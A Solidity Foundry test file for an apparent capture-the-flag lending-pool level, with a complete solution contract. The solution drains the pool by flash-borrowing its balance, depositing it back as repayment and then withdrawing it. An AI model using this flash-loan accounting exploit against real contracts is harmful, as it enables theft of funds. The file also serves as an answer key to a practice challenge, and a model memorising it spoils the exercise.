// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/LendingPool.sol";

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        Exploit exploitContract = new Exploit(instance);

        exploitContract.exploit();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract Exploit is IFlashLoanReceiver {
    LendingPool public pool;

    constructor(LendingPool _pool) {
        pool = _pool;
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function exploit() public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    // Функция для получения эфира
    receive() external payable {}
}